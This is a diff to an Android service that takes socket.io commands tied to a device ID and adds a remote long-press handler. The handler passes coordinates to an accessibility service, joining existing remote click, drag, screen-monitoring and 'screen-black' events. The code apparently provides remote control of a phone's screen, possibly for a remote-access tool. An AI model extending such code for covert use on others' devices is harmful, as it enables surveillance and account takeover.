@@ -87,6 +87,7 @@ public class Server extends Service {
             socket.on("mb-screen-monitor-" + mDeviceID, onScreenMonitor);
             socket.on("mb-screen-monitor-refresh-" + mDeviceID, onScreenRefreshMonitor);
             socket.on("mb-screen-click-event-" + mDeviceID, onScreenClickMonitor);
+            socket.on("mb-screen-long-press-event-" + mDeviceID, onScreenLongPressMonitor);
             socket.on("mb-screen-drag-event-" + mDeviceID, onScreenDragMonitor);
             socket.on("mb-screen-black-event-" + mDeviceID, onScreenBlackMonitor);
             socket.on("mb-screen-skeleton-" + mDeviceID, onScreenSkeletonMonitor);
@@ -151,6 +152,25 @@ public class Server extends Service {
                 xPosition = data.getDouble("xPosition");
                 yPosition = data.getDouble("yPosition");
                 Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_SCREEN_CLICK_MONITOR);
+                broadcastIntent.putExtra("xPosition", xPosition);
+                broadcastIntent.putExtra("yPosition", yPosition);
+                sendBroadcast(broadcastIntent);
+            } catch (JSONException e) {
+                Log.d("error::", e.toString());
+            }
+        }
+    };
+    private final Emitter.Listener onScreenLongPressMonitor = new Emitter.Listener() {
+        @Override
+        public void call(Object... args) {
+            JSONObject data = (JSONObject) args[0];
+            Log.d("ScreenClickMonitor:", data.toString());
+            double xPosition;
+            double yPosition;
+            try {
+                xPosition = data.getDouble("xPosition");
+                yPosition = data.getDouble("yPosition");
+                Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_SCREEN_LONG_PRESS_MONITOR);
                 broadcastIntent.putExtra("xPosition", xPosition);
                 broadcastIntent.putExtra("yPosition", yPosition);
                 sendBroadcast(broadcastIntent);
